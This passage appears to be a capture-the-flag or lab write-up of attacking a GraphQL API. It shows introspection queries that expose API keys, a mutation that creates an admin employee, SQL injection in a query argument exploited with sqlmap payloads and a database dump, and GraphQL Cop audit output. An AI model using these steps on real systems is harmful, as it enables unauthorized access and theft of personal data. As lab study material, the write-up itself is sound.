    }
    ```
    
    response:
    
    ```graphql
    {
      "data": {
        "__type": {
          "name": "ApiKeyObject",
          "fields": [
            {
              "name": "id",
              "type": {
                "name": null,
                "kind": "NON_NULL"
              }
            },
            {
              "name": "role",
              "type": {
                "name": "String",
                "kind": "SCALAR"
              }
            },
            {
              "name": "key",
              "type": {
                "name": "String",
                "kind": "SCALAR"
              }
            }
          ]
        }
      }
    }
    ```
    
    query for `EmployeeObject` type
    
    ```graphql
    {
      __type(name: "EmployeeObject"){
        name
        fields{
          name
          type{
            name
            kind
          }
        }
      }
    }
    ```
    
    response:
    
    ```graphql
    {
      "data": {
        "__type": {
          "name": "EmployeeObject",
          "fields": [
            {
              "name": "id",
              "type": {
                "name": null,
                "kind": "NON_NULL"
              }
            },
            {
              "name": "username",
              "type": {
                "name": "String",
                "kind": "SCALAR"
              }
            },
            {
              "name": "employeeId",
              "type": {
                "name": "Int",
                "kind": "SCALAR"
              }
            },
            {
              "name": "role",
              "type": {
                "name": "String",
                "kind": "SCALAR"
              }
            }
          ]
        }
      }
    }
    ```
    
    Query for `Query` type
    
    ```graphql
    {
      __type(name: "Query"){
        name
        fields{
          name
          type{
            name
            kind
          }
        }
      }
    }
    ```
    
    response:
    
    ```graphql
    {
      "data": {
        "__type": {
          "name": "Query",
          "fields": [
            {
              "name": "node",
              "type": {
                "name": "Node",
                "kind": "INTERFACE"
              }
            },
            {
              "name": "allEmployees",
              "type": {
                "name": null,
                "kind": "LIST"
              }
            },
            {
              "name": "employeeByUsername",
              "type": {
                "name": "EmployeeObject",
                "kind": "OBJECT"
              }
            },
            {
              "name": "allProducts",
              "type": {
                "name": null,
                "kind": "LIST"
              }
            },
            {
              "name": "productByName",
              "type": {
                "name": "ProductObject",
                "kind": "OBJECT"
              }
            },
            {
              "name": "activeApiKeys",
              "type": {
                "name": null,
                "kind": "LIST"
              }
            },
            {
              "name": "allCustomers",
              "type": {
                "name": null,
                "kind": "LIST"
              }
            },
            {
              "name": "customerByName",
              "type": {
                "name": "CustomerObject",
                "kind": "OBJECT"
              }
            }
          ]
        }
      }
    }
    ```
    

- **Query for fields of a specific type**
    
    we discovered that the `Query` types holds 8  fields:
    
    - `node`, `allEmployees`, `employeeByUsername`, `allProducts`, `productByName`, `activeApiKeys`, `allCustomers`, `customerByName`
    
    and the field `activeApiKeys` holds three fields, which are: `role`, `id`, `key` we can fetch the data it holds using the query:
    
    ```graphql
    query{
      activeApiKeys{
        id
        role
        key
      }
    }
    ```
    
    response:
    
    ```graphql
    {
      "data": {
        "activeApiKeys": [
          {
            "id": "QXBpS2V5T2JqZWN0OjE=",
            "role": "guest",
            "key": "fbb64ce26fbe8a8d8d6895b8e6ba21a3"
          },
          {
            "id": "QXBpS2V5T2JqZWN0OjI=",
            "role": "guest",
            "key": "9cf8622bbc9fdc78f245663e08e5b4c1"
          },
          {
            "id": "QXBpS2V5T2JqZWN0OjM=",
            "role": "admin",
            "key": "0711a879ed751e63330a78a4b195bbad"
          }
        ]
      }
    }
    ```
    

- Query for the field `allEmployees` of the `Query` type
    
    ```graphql
    query{
      allEmployees{
        id
        employeeId
        username
      }
    }
    ```
    
    response
    
    ```graphql
    {
      "data": {
        "allEmployees": [
          {
            "id": "RW1wbG95ZWVPYmplY3Q6MQ==",
            "employeeId": 1337,
            "username": "vautia"
          },
          {
            "id": "RW1wbG95ZWVPYmplY3Q6Mg==",
            "employeeId": 1338,
            "username": "pedant"
          },
          {
            "id": "RW1wbG95ZWVPYmplY3Q6Mw==",
            "employeeId": 1339,
            "username": "21y4d"
          }
        ]
      }
    }
    ```
    

### Mutations

- Using mutations to modify server data:
    
    ```graphql
    {
      __type(name: "Mutation"){
        name
        fields{
          name
          type{
            name
            kind
          }
        }
      }
    }
    ```
    
    result:
    
    ```graphql
    {
      "data": {
        "__type": {
          "name": "Mutation",
          "fields": [
            {
              "name": "addEmployee",
              "type": {
                "name": "AddEmployee",
                "kind": "OBJECT"
              }
            },
            {
              "name": "addProduct",
              "type": {
                "name": "AddProduct",
                "kind": "OBJECT"
              }
            },
            {
              "name": "addCustomer",
              "type": {
                "name": "AddCustomer",
                "kind": "OBJECT"
              }
            }
          ]
        }
      }
    }
    ```
    
    To view the `addEmployee` field of the mutation type, we first need to query for the `AddEmployee` object to see what fields to specify
    
    ```graphql
    {
      __type(name: "AddEmployee"){
        name
        fields{
          name
          type{
            name
            kind
          }
        }
      }
    }
    
    # response:
    {
      "data": {
        "__type": {
          "name": "AddEmployee",
          "fields": [
            {
              "name": "employee",
              "type": {
                "name": "EmployeeObject",
                "kind": "OBJECT"
              }
            }
          ]
        }
      }
    }
    ```
    
    the `addEmployee` field of the mutation type require the `employee` field and  also fields fetched from the `EmployeeObject` object
    
    ```graphql
    # request
    
    {
      __type(name: "EmployeeObject"){
        name
        fields{
          name
          type{
            name
            kind
          }
        }
      }
    }
    
    # response
    {
      "data": {
        "__type": {
          "name": "EmployeeObject",
          "fields": [
            {
              "name": "id",
              "type": {
                "name": null,
                "kind": "NON_NULL"
              }
            },
            {
              "name": "username",
              "type": {
                "name": "String",
                "kind": "SCALAR"
              }
            },
            {
              "name": "employeeId",
              "type": {
                "name": "Int",
                "kind": "SCALAR"
              }
            },
            {
              "name": "role",
              "type": {
                "name": "String",
                "kind": "SCALAR"
              }
            }
          ]
        }
      }
    }
    ```
    
    Now we know all required fields for the `addEmployee` field of the mutation type, lets query this mutation
    
    ```graphql
     mutation{
      addEmployee{
        employee{
          id
          username
          employeeId
          role
        }
      }
    }
    
    # response:
    {
      "errors": [
        {
          "message": "Field \"addEmployee\" argument \"input\" of type \"AddEmployeeInput!\" is required but not provided.",
          "locations": [
            {
              "line": 2,
              "column": 3
            }
          ]
        }
      ]
    }
    ```
    
    from the error, we must specify argument for the `addEmployee` mutation from `AddEmployeeInput` object. quey for this object to view its fields
    
    ```graphql
    {
      __type(name: "AddEmployeeInput") {
        name
        inputFields {  # Note we specifyed the inputFields instead of field, this is because it is an input type
          name
          description
          defaultValue
        }
      }
    }
    # response
    {
      "data": {
        "__type": {
          "name": "AddEmployeeInput",
          "inputFields": [   
            {
              "name": "username",
              "description": null,
              "defaultValue": null
            },
            {
              "name": "employeeId",
              "description": null,
              "defaultValue": null
            },
            {
              "name": "role",
              "description": null,
              "defaultValue": null
            }
          ]
        }
      }
    }
    ```
    
    So the required arguments are → (`username`, `employeeId`, `role`), and from the previous query, we know there is an `admin` and `guest` roles and the emplyeeID is four digits like this `1338` 
    
    ```graphql
    mutation{
      addEmployee(input: {username: "Aisha", employeeId:1444 ,role: "admin"}){
        employee{
          id
          username
          employeeId
          role
          
        }
      }
    }
    
    # response
    {
      "data": {
        "addEmployee": {
          "employee": {
            "id": "RW1wbG95ZWVPYmplY3Q6NA==",
            "username": "Aisha",
            "employeeId": 1444,
            "role": "admin"
          }
        }
      }
    }
    ```
    

### Testing for Injection Attacks

First I installed InQL extension on burp. We will start testing for SQL injection in the fields of the `Query` type that requires args. The fields to test: `employeeByUsername` and `customerByName`

---

1. Testing for `customerByName` of the `Query` for SQLi 

```graphql
 {
          "name": "customerByName",
          "type": {
            "name": "CustomerObject",
            "kind": "OBJECT"
          }
        }
      ]
```

First i need to discover its fields, as shown above, the `customerByName` grep’s its fields from the object named  `CustomerObject` and since it is an object, we can grep its fields using this query: 

```graphql
{
  __type(name: "CustomerObject"){
    name
    fields{
      name
      type{
        name
        kind
      }
    }
  }
}

# response:
{
  "data": {
    "__type": {
      "name": "CustomerObject",
      "fields": [
        {
          "name": "id",
          "type": {
            "name": null,
            "kind": "NON_NULL"
          }
        },
        {
          "name": "firstName",
          "type": {
            "name": "String",
            "kind": "SCALAR"
          }
        },
        {
          "name": "lastName",
          "type": {
            "name": "String",
            "kind": "SCALAR"
          }
        },
        {
          "name": "address",
          "type": {
            "name": "String",
            "kind": "SCALAR"
          }
        }
      ]
    }
  }
}
```

Now specify its fields, and if we don't know which args to add, lets the server tell us: 

```graphql
query{
  customerByName{
    id
    firstName
    lastName
    address
  }
}

# Response
{
  "errors": [
    {
      "message": "Field \"customerByName\" argument \"apiKey\" of type \"String!\" is required but not provided.",
      "locations": [
        {
          "line": 2,
          "column": 3
        }
      ]
    },
    {
      "message": "Field \"customerByName\" argument \"lastName\" of type \"String!\" is required but not provided.",
      "locations": [
        {
          "line": 2,
          "column": 3
        }
      ]
    }
  ]
}
```

as shown in the error, the required args are: `apiKey`, `lastName` the apikey was discovered in the **Introspection Queries** (in the `activeApiKeys` of the `Query` type) as for the customer's last name we can query for `allCustomers` field of the `Query` type which also require `apikey` as an argument

```graphql
query{
  allCustomers(apiKey:"0711a879ed751e63330a78a4b195bbad"){
    id
    firstName
    lastName
    address
  }
}

# response:
{
  "data": {
    "allCustomers": [
      {
        "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",
        "firstName": "Antony",
        "lastName": "Blair",
        "address": "13 Hide A Way Road. Winter Park, FL 32789"
      },
      {
        "id": "Q3VzdG9tZXJPYmplY3Q6Mg==",
        "firstName": "Margaret",
        "lastName": "Liverman",
        "address": "4797 New Street. Coos Bay, OR 97420 "
      },
      {
        "id": "Q3VzdG9tZXJPYmplY3Q6Mw==",
        "firstName": "Billy",
        "lastName": "Sawyer",
        "address": "587 Hickory Lane. Washington, DC 20017 "
      }
    ]
  }
}
```

Now start querying for a specific customer

```graphql
query{
  customerByName(lastName: "Liverman",apiKey:"0711a879ed751e63330a78a4b195bbad"){
    id
    firstName
    lastName
    address
  }
}

# response
{
  "data": {
    "customerByName": {
      "id": "Q3VzdG9tZXJPYmplY3Q6Mg==",
      "firstName": "Margaret",
      "lastName": "Liverman",
      "address": "4797 New Street. Coos Bay, OR 97420 "
    }
  }
}
```

**Testing For SQL Injection:**

```graphql
query{
  customerByName(lastName: "Liverman'",apiKey:"0711a879ed751e63330a78a4b195bbad"){
    id
    firstName
    lastName
    address
  }
}

# Response:
{
  "errors": [
    {
      "message": "(pymysql.err.ProgrammingError) (1064, \"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''Liverman'' \\n LIMIT 1' at line 3\")\n[SQL: SELECT customer.id AS customer_id, customer.`firstName` AS `customer_firstName`, customer.`lastName` AS `customer_lastName`, customer.address AS customer_address \nFROM customer \nWHERE lastName='Liverman'' \n LIMIT %(param_1)s]\n[parameters: {'param_1': 1}]\n(Background on this error at: https://sqlalche.me/e/20/f405)",
      "locations": [
        {
          "line": 2,
          "column": 3
        }
      ],
      "path": [
        "customerByName"
      ]
    }
  ],
  "data": {
    "customerByName": null
  }
}
```

An SQL error!! we finally found our attack point

I will let sqlmap do the rest of the work: First save the request as a text and put a `*` marker as the injection point

```bash
POST /graphql HTTP/1.1
Host: 154.57.164.79:32422
Content-Length: 178
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://154.57.164.79:32422
Referer: http://154.57.164.79:32422/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"query":"query{\r\n  customerByName(lastName: \"Liverman*\",apiKey:\"0711a879ed751e63330a78a4b195bbad\"){\r\n    id\r\n    firstName\r\n    lastName\r\n    address\r\n  }\r\n}"}
```

```bash
$ sqlmap -r req.txt --technique=EUB --union-cols=2 --dbs --dump --batch
...
sqlmap identified the following injection point(s) with a total of 55 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"query":"query{\r\n  customerByName(lastName: \"Liverman' AND 9073=9073 AND 'PLGa'='PLGa\",apiKey:\"0711a879ed751e63330a78a4b195bbad\"){\r\n    id\r\n    firstName\r\n    lastName\r\n    address\r\n  }\r\n}"}

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: {"query":"query{\r\n  customerByName(lastName: \"Liverman' AND EXTRACTVALUE(3741,CONCAT(0x5c,0x71787a7871,(SELECT (ELT(3741=3741,1))),0x7176767a71)) AND 'txDe'='txDe\",apiKey:\"0711a879ed751e63330a78a4b195bbad\"){\r\n    id\r\n    firstName\r\n    lastName\r\n    address\r\n  }\r\n}"}
---

```

The discovered tables in the `db` database:

```bash
$ ls /home/kali/.local/share/sqlmap/output//dump/db/
api_key.csv  customer.csv  employee.csv  flag.csv  product.csv
```

---

1. Testing `employeeByUsername` of the `Query` type for SQLi

```graphql
{
          "name": "employeeByUsername",
          "type": {
            "name": "EmployeeObject",
            "kind": "OBJECT"
          }
```

From the Query field result as shwn above, the `employeeByUsername` fetches its field from the `EmployeeObject` object, query for this object:

```bash
{
  __type(name: "EmployeeObject"){
    name
    fields{
      name
      type{
        name
        kind
      }
    }
  }
}
# response:
{
  "data": {
    "__type": {
      "name": "EmployeeObject",
      "fields": [
        {
          "name": "id",
          "type": {
            "name": null,
            "kind": "NON_NULL"
          }
        },
        {
          "name": "username",
          "type": {
            "name": "String",
            "kind": "SCALAR"
          }
        },
        {
          "name": "employeeId",
          "type": {
            "name": "Int",
            "kind": "SCALAR"
          }
        },
        {
          "name": "role",
          "type": {
            "name": "String",
            "kind": "SCALAR"
          }
        }
      ]
    }
  }
}
```

using the `EmployeeObject` object fields to query the data saved in the `employeeByUsername` 

```graphql
query{
  employeeByUsername{
    id
    username
    employeeId
    role
  }
}

# response:
{
  "errors": [
    {
      "message": "Field \"employeeByUsername\" argument \"username\" of type \"String!\" is required but not provided.",
      "locations": [
        {
          "line": 2,
          "column": 3
        }
      ]
    }
  ]
}
```

so the required args is the username: (we already discovered employees )

```graphql
query{
  employeeByUsername(username:"vautia"){
    id
    username
    employeeId
    role
  }
}

# Response:
{
  "data": {
    "employeeByUsername": {
      "id": "RW1wbG95ZWVPYmplY3Q6MQ==",
      "username": "vautia",
      "employeeId": 1337,
      "role": "employee"
    }
  }
}
```

SQL injection test:

```graphql
query{
  employeeByUsername(username:"vautia'"){  # note the ' marker
    id
    username
    employeeId
    role
  }
}

# response
{
  "data": {
    "employeeByUsername": null
  }
}
```

As you can see no result retuned, and we dont know if the injection was success 

### **Using GraphQL Cop - Security Audit Utility for GraphQL**

github source 

```bash
$ python3 graphql-cop.py --target="http://154.57.164.80:32563/"  
http://154.57.164.80:32563/ does not seem to be running GraphQL. (Consider using -f to force the scan if GraphQL does exist on the endpoint)
http://154.57.164.80:32563/graphiql does not seem to be running GraphQL. (Consider using -f to force the scan if GraphQL does exist on the endpoint)
http://154.57.164.80:32563/playground does not seem to be running GraphQL. (Consider using -f to force the scan if GraphQL does exist on the endpoint)
http://154.57.164.80:32563/console does not seem to be running GraphQL. (Consider using -f to force the scan if GraphQL does exist on the endpoint)
[HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service - /graphql)
[HIGH] Directive Overloading - Multiple duplicated directives allowed in a query (Denial of Service - /graphql)
[LOW] Field Suggestions - Field Suggestions are Enabled (Information Leakage - /graphql)
[MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF) - /graphql)
[LOW] GraphQL IDE - GraphiQL Explorer/Playground Enabled (Information Leakage - /graphql)
[HIGH] Introspection - Introspection Query Enabled (Information Leakage - /graphql)
[MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery - /graphql)
```